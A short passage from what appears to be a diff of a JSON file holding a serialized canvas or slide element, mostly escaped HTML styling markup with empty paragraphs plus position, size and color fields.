11pt; font-family: &quot;Courier New&quot;, monospace; color: rgb(255, 62, 62); font-variant-numeric: normal; font-variant-east-asian: normal; font-variant-alternates: normal; font-variant-position: normal; font-variant-emoji: normal; vertical-align: baseline; overflow-wrap: break-word; word-break: break-word;\"><br></span></span></div><div><p data-pm-slice=\"1 1 []\" style=\"overflow-wrap: break-word; word-break: break-word;\"><br></p><p data-pm-slice=\"1 1 []\" style=\"overflow-wrap: break-word; word-break: break-word;\"><span style=\"overflow-wrap: break-word; word-break: break-word;\" id=\"docs-internal-guid-0361a6d7-7fff-145e-6713-2e158d3e3067\"></span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-left: 72pt; margin-top: 0pt; margin-bottom: 0pt; white-space: normal; overflow-wrap: break-word; word-break: break-word;\"><br></p></div>",
+        "x": 294,
+        "y": 9,
+        "width": 706,
+        "height": 150,
+        "style": {},
+        "currentColor": "#ffffff"
+      }
+    ]
+  }
+]
